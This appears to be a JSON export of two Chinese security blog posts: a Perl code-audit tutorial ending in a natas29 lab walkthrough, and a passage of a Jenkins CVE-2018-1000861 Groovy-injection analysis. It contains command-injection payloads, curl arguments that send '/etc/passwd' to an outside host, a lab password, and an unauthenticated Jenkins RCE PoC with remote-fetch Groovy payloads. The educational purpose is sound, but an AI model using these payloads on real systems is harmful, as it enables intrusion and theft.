[{"title":"（信安之路首发）Perl基础&代码审计","date":"2020-11-24T14:12:46.000Z","path":"2020/11/24/Perl基础-代码审计/","text":"本篇博客首发于信安之路：《perl 代码审计从基础到实战》 0x01 Perl基础Perl基础部分参考自：https://www.runoob.com/perl/perl-tutorial.html 简介Perl全称Practical Extraction and Report Language，一种功能丰富的计算机程序语言，运行在超过100种计算机平台上，适用广泛，从大型机到便携设备，从快速原型创建到大规模可扩展开发，其最重要的特性是Perl内部集成了正则表达式的功能以及巨大的第三方代码库CPAN。 Perl语言的应用范围很广，除CGI以外，Perl被用于图形编程、系统管理、网络编程、金融、生物以及其他领域。由于其灵活性，Perl被称为脚本语言中的瑞士军刀。 Perl是一种弱类型语言。 运行方式 交互式：perl -e &lt;perl code&gt; 运行脚本（以.pl、.PL作为后缀）：perl script.pl 数据类型Perl是一种弱类型语言，所以变量不需要指定类型，Perl解释器会根据上下文自动选择匹配类型。 Perl有三个基本的数据类型： 标量：标量是 Perl 语言中最简单的一种数据类型。这种数据类型的变量可以是数字，字符串，浮点数，不作严格的区分。在使用时在变量的名字前面加上一个$，表示是标量。例如：$a=123; 数组：数组变量以字符@开头，索引从0开始，如：@arr=(1,2,3) 哈希：哈希是一个无序的键值对集合。可以使用键作为下标获取值。哈希变量以字符%开头。如：%h=(&#39;a&#39;=&gt;1,&#39;b&#39;=&gt;2); 基本语法Perl借用了C、sed、awk、shell脚本以及很多其他编程语言的特性，语法与这些语言有些类似，也有自己的特点。 Perl 程序有声明与语句组成，程序自上而下执行，包含了循环，条件控制，每个语句以分号 (;) 结束。 Perl 语言没有严格的格式规范，你可以根据自己喜欢的风格来缩进。 注释符Perl注释的方法为在语句的开头用字符#，如： 1# 这一行是 perl 中的注释 Perl也支持多行注释，最常用的方法是使用POD(Plain Old Documentations) 来进行多行注释。方法如下: 1234567891011#!/usr/bin/perl # 这是一个单行注释print \"Hello, world\\n\"; =pod 注释这是一个多行注释这是一个多行注释这是一个多行注释这是一个多行注释=cut 注意： =pod、 =cut只能在行首。 以=开头，以=cut结尾。 =后面要紧接一个字符，=cut后面可以不用。 空白符解析特点Perl解释器不会关心有多少个空白，所有类型的空白如空格、Tab、换行等如果在引号外解释器会忽略它，如果在引号内会原样输出。 1234#!/usr/bin/perlprint \"Hello world\\n\"; 输出： 12Hello world 单双引号解析区别Perl双引号和单引号的区别：双引号可以正常解析一些转义字符与变量，而单引号无法解析会原样输出，但是用单引号定义可以使用多行文本。这点和PHP类似（双引号解析变量、而单引号不解析变量）。 12345#!/usr/bin/perl $a = \"mi1k7ea\";print \"a = $a\\n\";print 'a = $a\\n'; 输出： 12a = mi1k7eaa = $a\\n Tips： （1）双中有双，单中有单都需要\\转义。 （2）双中有单或单中有双均不需要转义。 （3）单引号直接了当，引号内是什么就显示什么，双引号则需要考虑转义或变量替换等。 Here文档Here文档又称作heredoc、hereis、here-字串或here-脚本，是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字串的方法。 123456789101112131415#!/usr/bin/perl $a = 10;$var = &lt;&lt;\"Mi1k7ea\";这是一个 Here 文档实例，使用双引号。可以在这输如字符串和变量。例如：a = $aMi1k7eaprint \"$var\\n\"; $var = &lt;&lt;'Mi1k7ea';这是一个 Here 文档实例，使用单引号。例如：a = $aMi1k7eaprint \"$var\\n\"; 输出： 123456这是一个 Here 文档实例，使用双引号。可以在这输如字符串和变量。例如：a = 10这是一个 Here 文档实例，使用单引号。例如：a = $a 注意： 必须后接分号，否则编译通不过； EOF可以用任意其它字符代替（例子用的Mi1k7ea），只需保证结束标识与开始标识一致； 结束标识必须顶格独自占一行（即必须从行首开始，前后不能衔接任何空白和字符）； 开始标识可以不带引号号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号； 当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法； 子程序（函数）及传参Perl子程序即用户定义的函数。 123456789#!/usr/bin/perl # 函数定义sub Hello&#123; print \"Hello, World!\\n\";&#125; # 函数调用Hello(); 输出： 1Hello, World! Perl函数参数使用特殊数组@_标明，函数第一个参数为$_[0]、第二个参数为$_[1]，依次类推。 12345678#!/usr/bin/perlsub Test&#123; print '传入的参数：', \"@_\\n\"; return \"$_[0].$_[1]\";&#125;print \"返回结果：\", Test('mi1k7ea', 'com'), \"\\n\"; 输出： 12传入的参数：mi1k7ea com返回结果：mi1k7ea.com CGI环境搭建与CGI编程CGI环境搭建：下载Apache httpd服务器，直接运行然后访问http://localhost/cgi-bin/printEnv.pl即可： 正常没问题的话是如上图所示。注意一点，pl或cgi文件中第一行指定perl程序所在路径必须正确，否则会出现500 Error，我这里本地修改为#!D:\\Strawberry\\perl\\bin\\perl.exe。 第一个CGI程序，test.cgi： 12345678910111213#!D:/Strawberry/perl/bin/perl.exeprint \"Content-type:text/html\\r\\n\\r\\n\";print '&lt;html&gt;';print '&lt;head&gt;';print '&lt;meta charset=\"utf-8\"&gt;';print '&lt;title&gt;mi1k7ea.com&lt;/title&gt;';print '&lt;/head&gt;';print '&lt;body&gt;';print '&lt;h2&gt;Hello World!&lt;/h2&gt;';print '&lt;p&gt;Mi1k7ea的第一个CGI程序。&lt;/p&gt;';print '&lt;/body&gt;';print '&lt;/html&gt;'; 更多具体CGI参考：Perl CGI编程 0x02 Perl代码审计命令注入system()函数system()函数执行命令是有回显的。system后可以有圆括号，也可以没有。 参数全部可控12345$cmd = \"echo hacked\";system($cmd)# 或# $cmd = $ARGV[0];# system($cmd); 参数部分可控直接拼接命令的场景，可使用命令注入分隔符绕过： 12345$param = $ARGV[0];system(\"cat /tmp/$param\");# 或# $param = \";whoami\";# system(\"cat /tmp/$param\"); 将命令和参数分隔开就不行了，原因在于传递给system的参数变成了数组形式、严格按命令和参数进行区分了： 12345678$param = \";ls\";system(\"echo\", \"helloworld$param\");# 或# @cmd = (\"echo\",\"helloworld;ls\");# system @cmd;# 或# $param = $ARGV[0];# system(\"echo\", \"helloworld$param\"); 参数注入由前面数组形式执行system函数知道，命令注入是不成功的，但是某些写死的命令是可以进行参数注入的。但是这种注入方式较苛刻，需要有两处连续的可控点。 tar参数注入 tar命令的–use-compress-program参数选项可以执行shell命令，若存在参数注入则可利用。注入点需要–use-compress-program参数及其后面的参数值两处。 12@cmd = (\"tar\",\"--use-compress-program\",\"touch /tmp/perltest/mi1k7ea\",\"-cf\",\"/tmp/perltest/passwd\",\"/etc/passwd\");system @cmd; find参数注入 find命令的-exec参数选项可以执行命令，若存在参数注入则可利用。注入点需要–execs参数及其后面的参数值两处。 12@cmd = (\"find\",\"/tmp\",\"-iname\",\"sth\",\"-or\",\"-exec\",\"id\",\";\",\"-quit\");system @cmd; wget参数注入 wget命令的–directory-prefix参数选项可以将目标文件下载到指定目录中，若存在参数注入则可利用。注入点需要–directory-prefix参数及其后面的参数值两处和远程URL地址一处。 12@cmd = (\"wget\",\"--directory-prefix\",\"/var/www/html\",\"http://127.0.0.1:8080/shell.php\");system @cmd; sendmail参数注入 sendmail涉及到参数注入的几个参数： -O option = value：QueueDirectory = queuedir 选择队列消息 -X logfile：这个参数可以指定一个目录来记录发送邮件时的详细日志情况，我们正式利用这个参数来达到我们的目的。 -C file：这个参数用File变量指定的备用配置文件启动sendmail命令。 常见的参数注入方式，这里只列出用法不举例了： 向Web目录写日志Shell：-O QueueDirectory=/tmp -X /var/www/html/log-shell.php 任意文件读取：-C/etc/passwd -X/tmp/output.txt curl参数注入 curl命令的-F参数选项为以POST方式提交表单，-T参数选项为上传文件，这些参数选项都存在参数注入风险。 常见的参数注入方式，这里只列出用法不举例了： 以POST方式提交任意文件：-F filename=@/etc/passwd http://a.com/b.php 上传任意文件：-T /etc/passwd ftp://10.0.0.10 目录遍历在参数部分可控且不存在参数注入的场景下，如果注入的参数值为文件路径，那么就可以尝试进行目录遍历攻击。 比如： 12$param = $ARGV[0];system(\"cat /tmp/$param\"); exec()函数exec()函数和system()函数类似，执行命令是有回显的。exec后可以有圆括号，也可以没有。两者最大的区别是system()函数创建了一个fork进程，并等待查看命令是成功还是失败（返回一个值）；而exec()函数不返回任何内容，它只是执行命令。 参数全部可控12$cmd = \"echo exec_inject\";exec $cmd; 参数部分可控和前面system的情况一样，未进行数组分隔时能注入命令执行： 12$param = \";id\";exec(\"cat /tmp/$param\"); 同样，数组分隔传参就不行了： 12345$param = \";id\";exec(\"echo\", \"helloworld$param\");# 或# @a = (\"echo\",\"helloworld$ARGV[0]\");# exec @a; 此时可尝试如前面system()函数中讲到的参数注入或者目录遍历，这里不多说。 readpipe()函数readpipe()函数将EXPR作为命令执行，然后返回命令执行后的结果。也就是说，单单运行该函数是获取不到命令执行的回显结果的，需要结合print才能看到回显。 参数全部可控12345@result = readpipe(\"ls -l /tmp\");print \"@result\";# 执行命令无回显readpipe(\"touch /tmp/perltest/hacked\"); 参数部分可控readpipe()函数和前面两个命令执行函数不一样，即使是数组分隔命令和参数传参还是会执行命令！ 123@param = (\"cat\",\"/tmp/;id\");@result = readpipe @param;print \"@result\"; open()函数在Perl中open()函数被用来打开文件。该函数最为常见的使用形式如下： 1open (FILEHANDLE, \"filename\"); 在Perl的open()函数中，如果在文件名后加上管道符”|”，则Perl将会执行这个文件，而不是打开它。 参数全部可控open()函数的filename参数可以在其第一个字符前或最后一个字符后注入管道符来实现命令注入： 1234567open(STATFILE, \"|touch /tmp/perltest/hacked\");open(STATFILE, \"touch /tmp/perltest/hacked|\");# 有回显open(FILE, \"|id\");# 无回显open(FILE, \"id|\"); 参数部分可控因为filename一般就是某个文件路径，当filename参数前面已经指定好路径但实现参数拼接时，我们可以使用目录遍历的方法来实现注入： 12$param = \"../bin/touch /tmp/perltest/hacked|\";open(FILE, \"/tmp/$param\"); 但如果是有重定向符写死的就不可以注入了，如果filename是含有&gt;标志的前缀，那么它是为输出而打开的，并且如果文件已经存在据就会覆盖原文件；如果含有&gt;&gt;前缀，那么是为追加打开的；前缀&lt;打开文件来进行输入操作，这也是不含前缀的时候的默认方式。比如： 123456$param = \"../bin/touch /tmp/perltest/hacked|\";open(FILE, \"&lt;\", \"/tmp/$param\");# 或$param = \"../bin/touch /tmp/perltest/hacked|\";open(FILE, \"&lt;/tmp/$param\"); 反引号Perl的反引号和PHP的反引号一样，可用于执行系统命令。具体利用场景需要具体分析。 12$param = \"whoami\";print `$param`; 代码注入evalPerl的eval函数的参数就是一段Perl代码，与PHP以及JS的eval类似，会执行自己语言的代码。 Perl的eval有两种使用方式，即eval EXPR和eval BLOCK。 eval EXPREXPR即表达式。在执行时， Perl解释器会首先解析表达式的值，然后将表达式值作为一条Perl语句插入当前执行上下文。所以，新生成的语句与eval语句本身具有相同的上下文环境。这种方式中，每次执行eval语句，表达式都会被解析。所以，如果eval EXPR如果出现在循环中，表达式可能会被解析多次。 eval的这种方式使得Perl脚本程序能实时生成和执行代码，从而实现了“动态代码”。 使用示例： 123456eval \"print 'mi1k7ea'\";eval 'print $a' . ', $b' ;eval 1 + 3 ;eval 'print ' . '$a + $b, \"\\n\"' ;eval $command;#$command = 'print \"mi1k7ea\"'eval $ARGV[0]; 如果eval中的EXPR即Perl代码可控，我们可以直接传入前面说到的命令注入函数实现RCE。假设test.pl如下： 1eval $ARGV[0]; 此时直接注入system(&#39;touch /tmp/perltest/mi1k7ea&#39;)： eval BLOCKBLOCK即代码块。与第一种方式不同， BLOCK只会被解析一次，然后整个插入当前eval函数所在的执行上下文。由于解析上的性能的优势，以及可以在编译时进行代码语法检查，这种方式通常被作为Perl用来为一段代码提供异常捕捉机制，虽然前一种方式也可以。 使用示例： 12eval &#123;print $a&#125;;eval &#123;$a = 1, $b = 2, $c = $a + $b&#125;; 如果eval中的BLOCK即Perl代码可控，我们可以直接传入前面说到的命令注入函数实现RCE。假设test.pl如下： 1eval &#123;system(\"touch /tmp/perltest/mi1k7ea\");&#125;; 另一种Block调用： 1234567push ( @program,'system(\"touch /tmp/perltest/mi1k7ea\");');foreach $exp (@program)&#123; $return = eval($exp); print $return,\"\\n\";&#125; SQL注入Perl中操作数据库默认就支持预编译，但是如果使用不当同样是存在SQL注入漏洞的。关键在于，没有正确使用占位符?。 在Perl中可以使用DBI（Database Independent Interface）模块来连接数据库。DBI作为Perl语言中和数据库进行通讯的标准接口，它定义了一系列的方法、变量和常量，提供一个和具体数据库平台无关的数据库持久层。 DBI相关函数如下： connect()函数：用于连接数据库； prepare()函数：用于预处理SQL语句； execute()函数：用于执行SQL语句； finish()函数：用于释放语句句柄； disconnect()函数：用于断开数据库连接； 正确使用预编译占位符的例子： 1234567891011121314151617181920212223242526272829303132use strict;use DBI;my $host = \"localhost\";my $driver = \"mysql\";my $database = \"test\";# 驱动程序对象的句柄my $dsn = \"DBI:$driver:database=$database:$host\";my $userid = \"root\";my $password = \"root\";my $username = $ARGV[0];# 连接数据库my $dbh = DBI-&gt;connect($dsn, $userid, $password ) or die $DBI::errstr;# 预编译SQL语句，注意占位符?的使用my $sth = $dbh-&gt;prepare(\"SELECT * FROM users where username = ?\");# 执行SQL语句$sth-&gt;execute($username) or die $DBI::errstr;# 循环输出所有数据while ( my @row = $sth-&gt;fetchrow_array() )&#123; print join(':', @row).\"\\n\";&#125;$sth-&gt;finish();$dbh-&gt;disconnect(); 此时预编译会将占位符的内容定死为参数值而不会将其中的某些字符串解释为SQL关键字，也就根源上解决了SQL注入问题： 但是，如果没有正确使用预编译占位符，如下代码，在prepare()函数中直接拼接变量，就会同样存在SQL注入问题： 12345# 预编译SQL语句，未使用占位符?而是采用变量拼接的方式my $sth = $dbh-&gt;prepare(\"SELECT * FROM users where username = '$username'\");# 执行SQL语句$sth-&gt;execute() or die $DBI::errstr; 此时就能被SQL注入攻击： 结论：在prepare()函数进行预编译操作的时候，需要输入的参数值必须使用占位符，禁止直接使用变量拼接SQL语句。 XSSXSS是Web前端最常见的漏洞，Perl中也不缺席，关键还是在于Perl代码有没有进行HTML实体编码或者过滤特殊字符之后再输出到页面上。 比如下面CGI直接将参数原样不动返回到界面中： 12345678#!D:/Strawberry/perl/bin/perl.exeuse CGI;print \"Content-type: text/html\\n\\n\";$cgi = CGI-&gt;new();print $cgi-&gt;param('p'); 此时，就会产生XSS问题： 正确防御方法是进行HTML实体编码后再输出页面中： 1print CGI::escapeHTML($cgi-&gt;param('p')); 变量覆盖Perl语言的一些特性会导致存在一些变量覆盖问题，而变量覆盖往往会导致一些检测机制被绕过或者造成越权漏洞的产生。 哈希引入数组变量覆盖Perl的哈希中如果引入了数组，那么数组将会按键对值的结构扁平展开到哈希中，此时存在变量覆盖漏洞。 看个Demo，在hash中引入list，其中list包含hash中的一个键user并设置了对应的值admin： 1234567891011@list = (\"member\", \"user\", \"admin\");%hash = ( \"user\" =&gt; \"mi1k7ea\", \"password\" =&gt; \"666\", \"level\" =&gt; @list );while (($k, $v) = each %hash) &#123; print \"$k: $v\\n\";&#125; 输出，看到list中的键及值直接覆盖了原有的user键值对： 延伸到CGI场景中同理： 123456789101112#!D:/Strawberry/perl/bin/perl.exeuse CGI;print \"Content-type: text/html\\n\\n\";my $cgi = CGI-&gt;new();%user_info = (\"username\" =&gt; $cgi-&gt;param(\"username\"), \"password\" =&gt; \"123\");while (($k, $v) = each %user_info) &#123; print \"$k: $v\\n\";&#125; 正常请求/test.cgi?username=guest时，返回结果如下： 但是，当传入URL参数的key重复多次时/test.cgi?username=guest&amp;username=username&amp;username=admin，返回结果： 看到username参数被数组变量覆盖了。原理同上，即当URL传入多个同名参数时，$cgi-&gt;param()函数返回的是一个列表，输入参数username=test&amp;username=username&amp;username=admin时返回的是(&quot;test&quot;, &quot;username&quot;, &quot;admin&quot;)，此时数组就会和哈希结构进行合并，第一个元素guest则设置成username键的值，剩下的username和admin则单独组成为一对键值，新生成的键值对会覆盖掉原本的username的值为admin了。 案例——CVE-2014-1572（Bugzilla越权漏洞） 漏洞代码如下： 1234my $otheruser = Bugzilla::User-&gt;create(&#123; login_name =&gt; $login_name, realname =&gt; $cgi-&gt;param('realname'), cryptpassword =&gt; $password&#125;); 当提交下面请求内容时： 12a=confirm_new_account&amp;t=[TOKEN]&amp;passwd1=[password]&amp;passwd2=[password]&amp;realname=test&amp;realname=login_name&amp;realname=admin@bugzilla.org 此时传递给User-&gt;create()函数的结构如下： 12345&#123; realname =&gt; &apos;test&apos;, login_name =&gt; &apos;admin@bugzilla.org&apos;, cryptpassword =&gt; $password&#125; 这里漏洞根源正式往{}即哈希中传入数组，利用上述的特性导致变量覆盖从而导致越权漏洞的产生。 数组传参变量覆盖Perl的函数参数传递中如果传递的参数类型为数组，那么数组将会直接展开来赋值到对应位置的参数上，此时同样存在变量覆盖漏洞。 看个Demo，test()函数可传入三个参数，然后分别给其传入不同数量、某个参数类型为数组的参数： 1234567891011sub test &#123; ($a, $b, $c) = @_; print \"$a$b$c\\n\";&#125;test(1, 2);test(1, 2, 3);test((1, 2, 3));test(1, (2, 3));test(1, 2, 3, 4);test(1, (2, 3), 4); 输出： 可以看到，当传递给子程序的参数即便不够，传递的数组会被展开并赋值给a、b、c三个变量上；最后一个调用的第三个传入参数4并没有赋值给c变量。 这种数组传参覆盖的特性有啥安全问题？看个例子。 1234567891011121314151617181920212223242526272829303132333435#!D:/Strawberry/perl/bin/perl.exeuse CGI;use DBI;print \"Content-type: text/html\\n\\n\";sub sqli_filter&#123; my ( $str, $type ) = @_; defined $str or return \"NULL\"; defined $type &amp;&amp; ( $type == 6 ) and return $str; $str =~ s/\\\\/\\\\\\\\/sg; $str =~ s/\\'/\\\\\\'/sg; $str =~ s/\\\"/\\\\\\\"/sg; return $str;&#125;$cgi = CGI-&gt;new();my $user = sqli_filter($cgi-&gt;param('user'));print \"User Input After Filter: \".$user.\"&lt;br&gt;&lt;br&gt;\";my $dsn = \"DBI:mysql:database=test:localhost\";my $dbh = DBI-&gt;connect($dsn, \"root\", \"root\") or die $DBI::errstr;my $sth = $dbh-&gt;prepare(\"SELECT * FROM users where username = '$user'\");$sth-&gt;execute() or die $DBI::errstr;print \"SQL Query Result:&lt;br&gt;\";while ( my @row = $sth-&gt;fetchrow_array() )&#123; print join(':', @row).\"\\n\";&#125;$sth-&gt;finish();$dbh-&gt;disconnect(); 这个CGI程序会从Web端接收一个user参数，然后通过自定义的sqli_filter()函数进行SQL注入特殊字符转义处理，最后查询数据库中对应的用户信息（假设为正确使用预编译进行SQL语句处理）。 正常访问，输入用户名即可查询用户信息： 尝试进行SQL注入获取所有用户信息，注入?user=testuser&#39; or 1--+，发现单引号被转义了： 结合数组参数变量覆盖，注入?user=testuser&#39; or 1--+&amp;user=6，可以看到成功进行了SQL注入，绕过了sqli_filter的检测过滤： 导致sqli_filter被绕过的漏洞根源在于，给该函数传递的是一个数组参数，通过变量覆盖的特性将type变量值给覆盖为了6，从而绕过了检测逻辑。 随机数安全Perl中的rand()函数只是从标准C库中调用相应的rand()函数，而C库函数rand()是一个不安全随机函数、其生成的数字不是加密安全的。 在C/C++安全编码规范中也明确禁止使用rand()产生用于安全用途的伪随机数。 强伪随机数CSPRNG（安全可靠的伪随机数生成器(Cryptographically Secure Pseudo-Random Number Generator）的各种参考： Platform CSPRNG PHP mcrypt_create_iv, openssl_random_pseudo_bytes Java java.security.SecureRandom Dot NET (C#, VB) System.Security.Cryptography.RNGCryptoServiceProvider Ruby SecureRandom Python os.urandom Perl Math::Random::Secure C/C++ (Windows API) CryptGenRandom Any language on GNU/Linux or Unix Read from /dev/random or /dev/urandom 条件竞争条件竞争漏洞的根源在于两个逻辑相关的操作之间的执行存在时间差，而攻击者可以利用这个时间差来绕过某些逻辑实现攻击。 比如这段代码，先判断目标文件是否存在，如果不存在则创建并写入内容： 123unless (-e \"/tmp/a_temporary_file\") &#123; open (FH, \"&gt;/tmp/a_temporary_file\");&#125; 在这种情况下，这个时间差是指TOCTOU（检查时间-使用时间）。这里检测文件是否存在和打开写入文件两个操作之间存在一个时间差。如果攻击者利用这个时间差，在程序检测到文件不存在后就立即执行如下命令创建软链接到某个重要配置文件，如下： 1ln -s /tmp/a_temporary_file /etc/an_important_config_file 此时，程序过完这个时间差再来执行打开写入目标文件的操作时，由于目标文件已经被攻击者篡改为软链接因此会导致该重要配置文件被删除。 通常，最好的解决方法是在可能存在竞争条件的地方使用原子操作。这意味着仅使用一个系统调用即可检查文件并同时创建该文件，而不会给处理器提供机会在两者之间切换到另一个进程。 在刚刚的示例中，可以使用sysopen()函数并指定只写模式，而无需设置truncate标志来避免条件竞争的问题： 1234unless (-e \"/tmp/a_temporary_file\") &#123; #open (FH, \"&gt;/tmp/a_temporary_file\"); sysopen (FH, \"/tmp/a_temporary_file\", O_WRONLY); &#125; 这样，即使文件名被篡改了，但是当打开文件进行写入时也不会杀死它。 00截断类似PHP，Perl中也存在00截断的问题。 如下代码，假设file变量值”xxx”是外部可控的值，程序本意是想打开用户输入的值拼接上”.txt”后缀名的文件： 12$file = \"xxx\"; open(FILE, \"$file.txt\"); 此时，如果攻击者输入test%00，此时由于%00在URL解码变为0x00，其在Perl中代表了字符串的结束，因此open()函数打开的是”test”文件而不是”test.txt”文件。 当然，00截断的特性通常是结合其他漏洞进行组合绕过利用的，具体场景具体分析。 0x03 Perl漏洞实战看个Perl漏洞靶场： 123http://natas29.natas.labs.overthewire.orgusername:natas29password:airooCaiseiyee8he8xongien9euhe8b 访问目标站点，可以选择下拉框选项，这里点击”perl underground”后页面返回大量内容： 注意到参数名为file，推测后台是根据传入的参数名再传递给open()函数来打开处理。 尝试下open()函数的命令注入，输入|ls，注意管道符在前面是有回显的： 风平浪静，肯定是姿势不对。推测下原因，用open()函数打开的文件一般是要有后缀名的，而选项中的这几个file参数值都是不带后缀名的，那么就应该是后台对file参数值和后缀名进行一个拼接操作再open的。如果是这样，就能利用%00截断来截断掉后面拼接的后缀名使open()函数能够正确执行注入的命令。 输入|ls%00： 没毛病，通过%00截断的方式命令成功执行了，页面列出了当前目录下的所有文件。 我们看下index.pl的源码，输入|cat index.pl%00： 页面不太好看，直接看页面源码就得到index.pl的源码了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#!/usr/bin/perluse CGI qw(:standard);print &lt;&lt;END;Content-Type: text/html; charset=iso-8859-1&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"&gt;&lt;head&gt;&lt;!-- This stuff in the header has nothing to do with the level --&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /&gt;&lt;link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"&gt;&lt;/script&gt;&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=\"http://natas.labs.overthewire.org/js/wechall.js\"&gt;&lt;/script&gt;&lt;script&gt;var wechallinfo = &#123; \"level\": \"natas29\", \"pass\": \"airooCaiseiyee8he8xongien9euhe8b\" &#125;;&lt;/script&gt;&lt;/head&gt;&lt;body oncontextmenu=\"javascript:alert('right clicking has been blocked!');return false;\"&gt;&lt;style&gt;#content &#123; width: 1000px;&#125;pre&#123; background-color: #000000; color: #00FF00; &#125; &lt;/style&gt;&lt;h1&gt;natas29&lt;/h1&gt;&lt;div id=\"content\"&gt;END## morla /10111# '$_=qw/ljttft3dvu&#123;/,s/./print chr ord($&amp;)-1/eg'## credits for the previous level go to whoever # created insomnihack2016/fridginator, where i stole the idea from. # that was a fun challenge, Thanks! #print &lt;&lt;END;H3y K1dZ,&lt;br&gt;y0 rEm3mB3rz p3Rl rit3?&lt;br&gt;\\\\/\\\\/4Nn4 g0 olD5kewL? R3aD Up!&lt;br&gt;&lt;br&gt;&lt;form action=\"index.pl\" method=\"GET\"&gt;&lt;select name=\"file\" onchange=\"this.form.submit()\"&gt; &lt;option value=\"\"&gt;s3lEcT suMp1n!&lt;/option&gt; &lt;option value=\"perl underground\"&gt;perl underground&lt;/option&gt; &lt;option value=\"perl underground 2\"&gt;perl underground 2&lt;/option&gt; &lt;option value=\"perl underground 3\"&gt;perl underground 3&lt;/option&gt; &lt;option value=\"perl underground 4\"&gt;perl underground 4&lt;/option&gt; &lt;option value=\"perl underground 5\"&gt;perl underground 5&lt;/option&gt;&lt;/select&gt;&lt;/form&gt;ENDif(param('file'))&#123; $f=param('file'); if($f=~/natas/)&#123; print \"meeeeeep!&lt;br&gt;\"; &#125; else&#123; open(FD, \"$f.txt\"); print \"&lt;pre&gt;\"; while (&lt;FD&gt;)&#123; print CGI::escapeHTML($_); &#125; print \"&lt;/pre&gt;\"; &#125;&#125;print &lt;&lt;END;&lt;div id=\"viewsource\"&gt;c4n Y0 h4z s4uc3?&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;END 从源码看到，关键的漏洞点就是open(FD, &quot;$f.txt&quot;);，这里直接将外部输入的file参数和后缀名”.txt”拼接后直接放进open()函数中执行，导致了命令注入漏洞的存在。 靶场的要求是获得下一关即第30关的密码，这里看源码发现检测file参数值是否存在”natas”，因此需要结合一些shell技巧来绕过这个检测，可以输入如下一些命令绕过并搜索下一关的相关文件： 123456789|find / -name nat&apos;&apos;as30%00|find / -name nat&quot;&quot;as30%00|find / -name nat``as30%00|find / -name nat\\as30%00|find / -name nat?s30%00|find / -name nat$&#123;x&#125;as30%00|find / -name nat$(echo a)s30%00|find / -name nat`echo a`s30%00|find / -name n$&#123;SHELLOPTS:2:1&#125;t$&#123;SHELLOPTS:2:1&#125;s30%00 # failed 最后读取该文件即可|cat /etc/nat&#39;&#39;as_webpass/nat&#39;&#39;as30%00： 小结：该场景的漏洞点在于open()函数命令注入+%00截断。 0x04 参考Security Issues in Perl Scripts Perl 安全","tags":[{"name":"Perl","slug":"Perl","permalink":"https://www.mi1k7ea.com/tags/Perl/"},{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"代码审计","slug":"代码审计","permalink":"https://www.mi1k7ea.com/tags/代码审计/"}]},{"title":"（先知首发）从Jenkins RCE看Groovy代码注入","date":"2020-09-05T02:00:00.000Z","path":"2020/09/05/从Jenkins-RCE看Groovy代码注入/","text":"先知：https://xz.aliyun.com/t/8231 0x00 前言最近看了下Jenkins相关漏洞，实在是太膜拜Orange大佬的挖掘思路了！！！分析下之后发现不会Groovy，在学习借鉴Me7ell大佬分享的Groovy文章下，于是就整理出本篇文章。 0x01 从Jenkins RCE看起（CVE-2018-1000861）简介Jenkins是一个独立的开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件的持续集成变成可能。前身是Hudson是一个可扩展的持续集成引擎。可用于自动化各种任务，如构建，测试和部署软件。 Jenkins Pipeline是一套插件，支持将连续输送Pipeline实施和整合到Jenkins。Pipeline提供了一组可扩展的工具，用于通过PipelineDSL为代码创建简单到复杂的传送Pipeline。 Jenkins远程代码执行漏洞（CVE-2018-1000861），简单地说，就是利用Jenkins动态路由机制的缺陷来绕过ACL的限制，结合绕过Groovy沙箱的Groovy代码注入来实现无验证RCE的攻击利用。 漏洞复现直接用的Vulhub的环境：https://vulhub.org/#/environments/jenkins/CVE-2018-1000861/ PoC： 1http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=%70%75%62%6c%69%63%20%63%6c%61%73%73%20%78%20%7b%0d%0a%20%20%70%75%62%6c%69%63%20%78%28%29%7b%0d%0a%20%20%20%20%22%74%6f%75%63%68%20%2f%74%6d%70%2f%6d%69%31%6b%37%65%61%22%2e%65%78%65%63%75%74%65%28%29%0d%0a%20%20%7d%0d%0a%7d 其中URL编码部分为： 12345public class x &#123; public x()&#123; \"touch /tmp/mi1k7ea\".execute() &#125;&#125; 除此之外，还有其他类型的PoC： 12345678910@groovy.transform.ASTTest(value=&#123; \"touch /tmp/mi1k7ea\".execute() &#125;)class Person&#123;&#125;或@groovy.transform.ASTTest(value=&#123;assert Runtime.getRuntime().exec(\"touch /tmp/mi1k7ea\")&#125;)class Person&#123;&#125;或@GrabConfig(disableChecksums=true)@GrabResolver(name='Exp', root='http://127.0.0.1:8000/')@Grab(group='test', module='poc', version='0')import Exp; 无需登录认证发起攻击： 成功RCE： 漏洞原理简析网上很多文章包括Orange大佬的博客都讲解得很详细了，这里只是简单提下关键点。 Jenkins动态路由机制Jenkins是基于Stapler框架开发的，在web.xml中可以看到Jenkins是将所有的请求交给org.kohsuke.stapler.Stapler来进行处理的，而Stapler是使用一套Naming Convention来实现动态路由的。该动态路由机制是先以/作为分隔符将URL切分，然后以jenkins.model.Jenkins作为入口点开始往下遍历，如果URL切分部分满足以下条件则继续往下调用： Public属性的成员变量； Public属性的方法，主要是getter方法，具体如下： get&lt;token&gt;() get&lt;token&gt;(String) get&lt;token&gt;(Int) get&lt;token&gt;(Long) get&lt;token&gt;(StaplerRequest) getDynamic(String, …) doDynamic(…) do&lt;token&gt;(…) js&lt;token&gt;(…) Class method with @WebMethod annotation Class method with @JavaScriptMethod annotation 简单地说，Jenkins动态路由机制在解析URL的时候会调用相关类的getter方法。 